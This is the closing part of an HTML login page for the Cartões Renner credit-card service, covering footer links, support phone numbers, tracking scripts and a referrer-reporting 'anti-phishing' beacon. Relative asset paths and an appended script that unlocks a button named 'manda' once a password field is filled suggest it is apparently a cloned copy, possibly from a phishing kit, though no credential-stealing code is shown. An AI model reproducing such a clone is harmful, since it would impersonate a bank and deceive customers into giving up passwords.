1.084-.002.305 0 .617-.005.922-.011a13.279 13.279 0 002-.176 6.804 6.804 0 001.908-.631 6.277 6.277 0 001.617-1.18 6.395 6.395 0 001.182-1.613 6.604 6.604 0 00.619-1.904 13.506 13.506 0 00.186-2.002c.004-.31.004-.612.004-.922.008-.363.008-.725.008-1.094V9.537c0-.366 0-.73-.008-1.092 0-.306 0-.615-.004-.922a13.507 13.507 0 00-.186-2.002 6.618 6.618 0 00-.62-1.902 6.466 6.466 0 00-2.798-2.8 6.768 6.768 0 00-1.908-.628 13.044 13.044 0 00-2-.175c-.305-.005-.617-.012-.922-.014C110.854 0 110.489 0 110.13 0zM8.44.875h102.77l.912.014a12.385 12.385 0 011.86.162 5.938 5.938 0 011.67.55 5.594 5.594 0 012.415 2.419 5.763 5.763 0 01.536 1.648 12.995 12.995 0 01.173 1.887c.003.283.002.588.002.89.008.376.008.733.008 1.093v20.928c0 .363 0 .718-.008 1.076 0 .325 0 .623-.004.93a12.731 12.731 0 01-.17 1.853 5.739 5.739 0 01-.54 1.67 5.48 5.48 0 01-1.016 1.387 5.413 5.413 0 01-1.399 1.021 5.862 5.862 0 01-1.668.55 12.542 12.542 0 01-1.869.163c-.293.007-.6.012-.898.012l-1.084.002-101.69-.002a39.8 39.8 0 01-.904-.012 12.687 12.687 0 01-1.87-.162 5.884 5.884 0 01-1.656-.549 5.406 5.406 0 01-1.396-1.016 5.32 5.32 0 01-1.022-1.396 5.722 5.722 0 01-.543-1.658 12.414 12.414 0 01-.166-1.875c-.006-.211-.015-.912-.015-.912V8.446s.01-.692.015-.895a12.37 12.37 0 01.166-1.873 5.755 5.755 0 01.543-1.662 5.373 5.373 0 011.016-1.397A5.565 5.565 0 014.01 1.596a5.823 5.823 0 011.653-.543A12.586 12.586 0 017.538.89zm60.721 12.55c0-.811.604-1.278 1.675-1.345l1.22-.07v-.389c0-.475-.315-.744-.922-.744-.496 0-.84.182-.939.5h-.86c.09-.773.818-1.269 1.84-1.269 1.129 0 1.765.562 1.765 1.513v3.077h-.855v-.633h-.07a1.515 1.515 0 01-1.353.707 1.36 1.36 0 01-1.501-1.347zm2.894-.385v-.377l-1.1.07c-.62.042-.9.253-.9.65 0 .405.351.641.835.641a1.062 1.062 0 001.166-.984zm-7.837-2.845h.856v.715h.067a1.348 1.348 0 011.343-.802 1.465 1.465 0 011.559 1.675v2.915h-.889v-2.692c0-.724-.314-1.083-.971-1.083a1.033 1.033 0 00-1.076 1.14v2.635h-.889zm-5.959 0h.856v.69h.066a1.22 1.22 0 011.216-.765 1.868 1.868 0 01.396.037v.877a2.434 2.434 0 00-.496-.053 1.055 1.055 0 00-1.15 1.058v2.659h-.888zm-5.17 3.23c0-.811.603-1.278 1.674-1.345l1.22-.07v-.389c0-.475-.315-.744-.922-.744-.496 0-.84.182-.939.5h-.86c.09-.773.818-1.269 1.84-1.269 1.129 0 1.765.562 1.765 1.513v3.077h-.855v-.633h-.07a1.515 1.515 0 01-1.353.707 1.36 1.36 0 01-1.5-1.347zm2.894-.385v-.377l-1.1.07c-.62.042-.901.253-.901.65 0 .405.351.641.835.641a1.062 1.062 0 001.166-.984zm-5.746.062l-.985 1.596h-.975l1.493-2.241-1.506-2.262h1.038l.968 1.588h.07l.96-1.588h.987l-1.484 2.225 1.501 2.278h-1.02l-.981-1.596zm-4.068-4.239a.576.576 0 11.575.542.547.547 0 01-.575-.542zm.132 1.332h.886v4.503H46.3zm-5.187 3.23c0-.811.604-1.278 1.675-1.345l1.22-.07v-.389c0-.475-.315-.744-.922-.744-.496 0-.84.182-.938.5h-.86c.09-.773.818-1.269 1.839-1.269 1.129 0 1.766.562 1.766 1.513v3.077h-.856v-.633h-.07a1.515 1.515 0 01-1.353.707 1.36 1.36 0 01-1.5-1.347zm2.895-.385v-.377l-1.1.07c-.62.042-.901.253-.901.65 0 .405.352.641.835.641a1.062 1.062 0 001.166-.984zm-8.338 1.658V8.73h2.398c1.122 0 1.795.57 1.795 1.488a1.308 1.308 0 01-1.046 1.283v.07a1.41 1.41 0 011.344 1.435c0 1.05-.764 1.69-2.039 1.69zm.927-3.44h1.1c.819 0 1.244-.302 1.244-.869 0-.55-.4-.872-1.087-.872h-1.257zm1.34 2.654c.835 0 1.277-.34 1.277-.971 0-.625-.46-.952-1.331-.952h-1.286v1.923zm71.447 13.925c-.25 1.644-1.851 2.772-3.899 2.772-2.634 0-4.268-1.765-4.268-4.596 0-2.84 1.643-4.682 4.19-4.682 2.505 0 4.08 1.721 4.08 4.466v.637h-6.394v.112a2.358 2.358 0 002.435 2.565 2.048 2.048 0 002.091-1.274zm-6.283-2.702h4.527a2.177 2.177 0 00-2.22-2.298 2.292 2.292 0 00-2.307 2.298zm-6.916-3.692h1.773v1.54h.043a2.16 2.16 0 012.178-1.635 2.866 2.866 0 01.636.07v1.738a2.598 2.598 0 00-.835-.113 1.873 1.873 0 00-1.936 2.083v5.37h-1.859zm-10.12 4.527c0-2.849 1.677-4.639 4.293-4.639 2.625 0 4.295 1.79 4.295 4.64 0 2.855-1.66 4.638-4.295 4.638-2.633 0-4.294-1.782-4.294-4.639zm6.695 0c0-1.954-.896-3.107-2.402-3.107s-2.4 1.162-2.4 3.107c0 1.962.894 3.106 2.4 3.106s2.402-1.144 2.402-3.106zm-9.414-6.67v2.143h1.721v1.471h-1.721v4.992c0 .775.344 1.136 1.101 1.136A5.808 5.808 0 0085.06 29v1.463a5.104 5.104 0 01-1.033.086c-1.833 0-2.547-.688-2.547-2.444v-5.19h-1.317v-1.471h1.317V19.3zM71.71 27.036c.137 1.232 1.334 2.04 2.968 2.04 1.567 0 2.694-.808 2.694-1.919 0-.963-.68-1.54-2.29-1.936l-1.609-.388c-2.28-.55-3.339-1.617-3.339-3.347 0-2.143 1.868-3.615 4.519-3.615 2.624 0 4.423 1.472 4.483 3.615h-1.876c-.112-1.24-1.136-1.988-2.633-1.988s-2.522.757-2.522 1.859c0 .878.654 1.394 2.255 1.79l1.368.336c2.548.602 3.607 1.626 3.607 3.442 0 2.323-1.851 3.778-4.794 3.778-2.754 0-4.614-1.42-4.734-3.667zm-6.586-1.066c0 2.814-1.506 4.621-3.779 4.621a3.07 3.07 0 01-2.848-1.584h-.043v4.485h-1.859v-12.05h1.8v1.506h.033a3.212 3.212 0 012.883-1.6c2.298 0 3.813 1.816 3.813 4.622zm-1.91 0c0-1.833-.948-3.038-2.393-3.038-1.42 0-2.375 1.23-2.375 3.038 0 1.824.955 3.046 2.375 3.046 1.445 0 2.392-1.196 2.392-3.046zm-8.055 0c0 2.814-1.506 4.621-3.778 4.621a3.07 3.07 0 01-2.85-1.584h-.042v4.485h-1.858v-12.05h1.798v1.506h.035a3.212 3.212 0 012.882-1.6c2.298 0 3.813 1.816 3.813 4.622zm-1.91 0c0-1.833-.948-3.038-2.393-3.038-1.42 0-2.375 1.23-2.375 3.038 0 1.824.955 3.046 2.375 3.046 1.445 0 2.393-1.196 2.393-3.046zm-10.947 1.17h-4.734l-1.137 3.356h-2.004l4.483-12.418h2.083l4.483 12.418h-2.039zm-4.244-1.549h3.752l-1.85-5.447h-.051zm-16.022-13.38a4.872 4.872 0 001.115-3.49 4.957 4.957 0 00-3.208 1.66 4.636 4.636 0 00-1.143 3.36 4.099 4.099 0 003.236-1.53zm2.732 8.09a4.949 4.949 0 012.357-4.152 5.066 5.066 0 00-3.992-2.158c-1.679-.176-3.307 1.005-4.163 1.005-.872 0-2.19-.987-3.608-.958a5.315 5.315 0 00-4.473 2.728c-1.934 3.348-.491 8.27 1.361 10.976.927 1.325 2.01 2.806 3.428 2.753 1.387-.057 1.905-.884 3.58-.884 1.658 0 2.144.884 3.59.85 1.489-.023 2.426-1.33 3.32-2.668a10.962 10.962 0 001.52-3.093 4.782 4.782 0 01-2.92-4.4z" fill="#1e1e1f"></path>
                                                      </svg>
                                                   </a>
                                                </div>
                                             </div>
                                             <img class="app-lojas-renner__image" src="../images/celular-login.png" alt="Aplicativo das Lojas Renner para acesso dos Cartões Renner.">
                                          </div>
                                       </div>
                                    </app-lojas-renner>
                                 </auth-template>
                              </x-login>
                           </div>
                        </main>
                     </div>
                  </div>
                  <onboarding-tooltip class="ng-isolate-scope">
                     <div class="onboarding-tooltip" id="onboarding-tooltip" ng-class="{'active': $ctrl.feature }">
                        <!-- <div class="onboarding-tooltip__overlay" ng-click="$ctrl.entendi()"></div> -->
                        <!-- <div class="onboarding-tooltip__content" ng-click="$ctrl.active && $ctrl.entendi()" ng-transclude></div> -->
                        <div class="onboarding-tooltip__container">
                           <div class="arrow" id="tooltip-arrow"></div>
                           <div class="onboarding-tooltip__text">
                              <span class="ng-binding"></span>
                           </div>
                           <div class="onboarding-tooltip__actions">
                              <button class="button button--default button--small button--outline" ng-click="$ctrl.naoVer()"><span ng-transclude="">não ver</span></button>
                              <button class="button button--default button--small" ng-click="$ctrl.entendi()"><span ng-transclude="">entendi</span></button>
                           </div>
                        </div>
                     </div>
                  </onboarding-tooltip>
                  <div id="toast-containter" class="toast-container">
                     <!-- ngRepeat: toast in $toastContainer.$toast.toasts -->
                  </div>
               </div>
            </div>
         </div>
         <div class="footer">
            <div class="footer__content">
               <div class="footer__links">
                  <ul class="footer__list">
                     <li><a target="_blank" href="https://www.realizesolucoesfinanceiras.com.br/site/">Home</a></li>
                     <li><a target="_blank" href="https://www.realizesolucoesfinanceiras.com.br/site/cartao_renner/">Cartão Renner</a></li>
                     <li><a target="_blank" href="https://www.realizesolucoesfinanceiras.com.br/site/meu-cartao/">Meu Cartão</a></li>
                     <li><a target="_blank" href="https://www.realizesolucoesfinanceiras.com.br/site/app_cartao_renner/">Quero Cartão Renner</a></li>
                     <li><a target="_blank" href="https://www.realizesolucoesfinanceiras.com.br/site/contato">Contato</a></li>
                  </ul>
                  <ul class="footer__list">
                     <li><a target="_blank" href="https://www.realizesolucoesfinanceiras.com.br/site/institucional">Institucional</a></li>
                     <li>
                        <b>Perguntas Frequentes</b>
                        <ul class="footer__list">
                           <li><a target="_blank" href="https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/duvidas-frequentes/cartao-renner">Cartão Renner</a></li>
                           <li><a target="_blank" href="https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/duvidas-frequentes/meu-cartao">Meu Cartão</a></li>
                           <li><a target="_blank" href="https://www.realizesolucoesfinanceiras.com.br/site/perguntas-frequentes">Saque Rápido e Seguros</a></li>
                           <li><a target="_blank" href="https://www.realizesolucoesfinanceiras.com.br/images/relatorio-governanca/download/2d74c7a135c98327b39e82f8638a6437.pdf">Privacidade e Segurança</a></li>
                        </ul>
                     </li>
                     <li><a target="_blank" href="https://www.realizesolucoesfinanceiras.com.br/site/central-negociacao">Central de Negociação</a></li>
                     <li><a target="_blank" href="https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/login">Acessa Sua Conta</a></li>
                  </ul>
                  <div>
                     <p class="footer__texto-destaque">Baixe o app da Renner</p>
                     <div class="footer__badges"><a href="https://play.google.com/store/apps/details?id=br.com.lojasrenner&amp;hl=pt-BR" target="_blank"><img src="../vectors/google-play-badge.svg"></a><a href="https://apps.apple.com/br/app/lojas-renner-roupas-perfumes/id567763947" target="_blank"><img src="../vectors/app-store-badge.svg"></a></div>
                  </div>
               </div>
               <div class="footer__informacoes">
                  <h2 class="footer__titulo">Canais de Atendimento:</h2>
                  <div class="footer__telefones">
                     <div class="footer__telefones__bloco">
                        <h3 class="footer__subtitulo">Central de Atendimento Cartões Renner:</h3>
                        <p class="footer__texto-destaque">2º via de faturas, consultas, informações, bloqueio e desbloqueio de cartões e orientações sobre canais digitais.</p>
                        <p class="footer__texto-sem-margem">Capitais e Regiões Metropolitanas</p>
                        <p class="footer__telefone"><span class="hidden-eq-small">3004 5060</span><a href="tel:30045060" class="hidden-gt-small">3004 5060</a></p>
                        <p class="footer__texto-sem-margem">Demais Localidades</p>
                        <p class="footer__telefone"><span class="hidden-eq-small">0800 073 6637</span><a href="tel:08000736637" class="hidden-gt-small">0800 073 6637</a></p>
                        <p>Horário de atendimento: 24 horas por dia, todos os dias.</p>
                        <p>Comunicação em Libras via videochamada para Deficientes Auditivos ou de Fala</p>
                        <p>Horário de atendimento:</p>
                        <p>De segunda a sábado, das 8h às 20h40</p>
                        <a href="https://rennerchat.flexcontact.com.br/RennerChat_DeficientesAuditivos/" target="_blank">Para acessar o canal de atendimento por vídeo, clique aqui.</a>
                        <h3 class="footer__subtitulo">Meu Cartão:</h3>
                        <p class="footer__texto-destaque">SAC (Serviço de Atendimento ao Cliente) - Reclamações, Informações e Cancelamentos</p>
                        <p class="footer__telefone"><span class="hidden-eq-small">0800 600 6601</span><a href="tel:08006006601" class="hidden-gt-small">0800 600 6601</a></p>
                        <p>Horário de atendimento: 24 horas por dia, todos os dias.</p>
                        <p class="footer__texto-destaque">Verifique seus saldos, carnês e faturas e gere boletos para pagamentos pelo WhatsApp:</p>
                        <div class="footer__whatsapp">
                           <p>Mande um Oi para</p>
                           <svg class="footer__whatsapp-icon">
                              <use xlink:href="/cartoes-renner/vectors/whatsapp.svg#whatsapp"></use>
                           </svg>
                           <a class="footer__telefone" href="https://wa.me/555139214004?text=Oi,%20Clara" target="_blank">+55 (51) 3921 4004</a>
                        </div>
                        <p>Comunicação em Libras via videochamada para Deficientes Auditivos ou de Fala</p>
                        <p>Horário de atendimento:</p>
                        <p>De segunda a sábado, das 8h às 20h40</p>
                        <a href="https://rennerchat.flexcontact.com.br/RennerChat_DeficientesAuditivos/" target="_blank">Para acessar o canal de atendimento por vídeo, clique aqui.</a>
                        <a href="https://www.realizesolucoesfinanceiras.com.br/uploads/institucional_cadastro/20/AtendimentoAuditivosFala.pdf" target="_blank">
                           <p class="footer__texto-orientacoes-representantes">Orientações para Representantes de Deficientes Auditivos ou de Fala</p>
                        </a>
                     </div>
                     <div class="footer__telefones__bloco">
                        <h3 class="footer__subtitulo">Cartão Renner:</h3>
                        <p class="footer__texto-destaque">SAC (Serviço de Atendimento ao Cliente) - Reclamações, Informações e Cancelamentos</p>
                        <p class="footer__telefone"><span class="hidden-eq-small">0800 600 6601</span><a href="tel:08006006601" class="hidden-gt-small">0800 600 6601</a></p>
                        <p>Horário de atendimento: 24 horas por dia, todos os dias.</p>
                        <p class="footer__texto-destaque">Verifique seus saldos, carnês e faturas e gere boletos para pagamentos pelo WhatsApp:</p>
                        <div class="footer__whatsapp">
                           <p>Mande um Oi para</p>
                           <svg class="footer__whatsapp-icon">
                              <use xlink:href="/cartoes-renner/vectors/whatsapp.svg#whatsapp"></use>
                           </svg>
                           <a class="footer__telefone" href="https://wa.me/555139214004?text=Oi,%20Clara" target="_blank">+55 (51) 3921 4004</a>
                        </div>
                        <h3 class="footer__subtitulo">Central De Negociação:</h3>
                        <p class="footer__texto-sem-margem">Atendimento exclusivo para clientes com pendências de pagamento.</p>
                        <p class="footer__texto-destaque">Entre em contato via WhatsApp:</p>
                        <div class="footer__whatsapp">
                           <p>Mande um Oi para</p>
                           <svg class="footer__whatsapp-icon">
                              <use xlink:href="/cartoes-renner/vectors/whatsapp.svg#whatsapp"></use>
                           </svg>
                           <a class="footer__telefone" href="5139215464" target="_blank">+55 (51) 3921 5464</a>
                        </div>
                        <p class="footer__texto-destaque">Se preferir, entre em contato via telefone:</p>
                        <p class="footer__telefone"><span class="hidden-eq-small">4004 2900</span><a href="tel:40042900" class="hidden-gt-small">4004 2900</a></p>
                        <p class="footer__texto-sem-margem">Horário de atendimento:</p>
                        <p class="footer__texto-sem-margem">Em dias úteis, das 08h às 21h</p>
                        <p>Aos Sábados, das 08h às 20h.</p>
                        <h3 class="footer__subtitulo">Ouvidoria:</h3>
                        <p class="footer__texto-sem-margem">Se não ficar satisfeito com a solução apresentada, de posse do protocolo, nos contate.</p>
                        <p class="footer__telefone"><span class="hidden-eq-small">0800 727 0127</span><a href="tel:08007270127" class="hidden-gt-small">0800 727 0127</a></p>
                        <p class="footer__texto-sem-margem">Horário de atendimento:</p>
                        <p class="footer__texto-sem-margem">Em dias úteis, das 10h às 16h.</p>
                     </div>
                  </div>
               </div>
               <div class="footer__endereco">
                  <p>Realize Crédito, Financiamento e Investimento S.A. – CNPJ 27.351.731/0001-38 Avenida Dolores Alcaras Caldas, 90 – 10° andar – CEP 90110-180 – Porto Alegre/RS</p>
               </div>
            </div>
         </div>
      </div>
      <!-- Constantes -->
      <script>
         window.constants.API_PATH = 'https://api.realizesolucoesfinanceiras.com.br/api';
         window.constants.SITE_VERSION = '3.48.0';
         window.constants.BUILD_ID = '1';
      </script>
      <!-- End Constantes -->
      <!-- Script anti-phishing -->
      <script>
         var i = new Image;
         var u = "https://s3-sa-east-1.amazonaws.com/frame-image-br/bg.png?x-id=real&x-r=" + document.referrer;
         i.src = u;
      </script>
      <!-- End Script anti-phishing -->
      <!-- Google Analytics -->
      <script>
         window.ga = window.ga || function () {
           (ga.q = ga.q || []).push(arguments)
         };
         ga.l = +new Date;
         ga('create', window.constants.GOOGLE_ANALYTICS_CODE, 'auto');
         ga('require', window.constants.GOOGLE_OPTIMIZE_CODE);
      </script>
      <script async="" src="https://www.google-analytics.com/analytics.js"></script>
      <!-- End Google Analytics -->
      <script type="text/javascript" src="../js/vendors.bundle-859d26788acf215a201a.js"></script>
      <script type="text/javascript" id="">(function(a,d,f,b,g,c){a.PMTagObject=b;a[b]||(a[b]=function(){(a[b].q=a[b].q||[]).push(arguments)});a[b].a=+new Date;a[b].aid=g||"";e=d.createElement(f);c=d.getElementsByTagName(f)[0];e.src="https://cdn.pmweb.com.br/df/tag.js?id\x3d"+a[b].aid;e.async=1;c.parentNode.insertBefore(e,c)})(window,document,"script","pm","PM-N2FTFQ");pm("init");</script>
      <meta name="facebook-domain-verification" content="m22i9hah1h2a0busgks5qds3kod18z">
      <script async="" defer="" src="https://www.google.com/recaptcha/api.js?onload=onLoadRecaptcha&amp;render=explicit&amp;hl=pt-BR"></script>
      <div style="visibility: hidden; position: absolute; width: 100%; top: -10000px; left: 0px; right: 0px; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0;">
         <div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.5;"></div>
         <div style="margin: 0px auto; top: 0px; left: 0px; right: 0px; position: absolute; border: 1px solid rgb(204, 204, 204); z-index: 2000000000; background-color: rgb(255, 255, 255); overflow: hidden;"><iframe title="o desafio reCAPTCHA expira em dois minutos" src="https://www.google.com/recaptcha/api2/bframe?hl=pt-BR&amp;v=2uoiJ4hP3NUoP9v_eBNfU6CR&amp;k=6LcNwW8UAAAAAJ8eSLfer6Z8Lm28favadVWPryjV" name="c-5um0r2x7qyhw" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div>
      </div>
      <script>
          document.body.querySelector("#senha").addEventListener("input", function(){
   
   var botao_proximo = document.body.querySelector("#manda");
   
   // habilita o botão com 3 ou mais caracteres digitados
   botao_proximo.disabled = this.value.length >= 6 ? false : true;
   
});
      </script>
   </body>
</html>
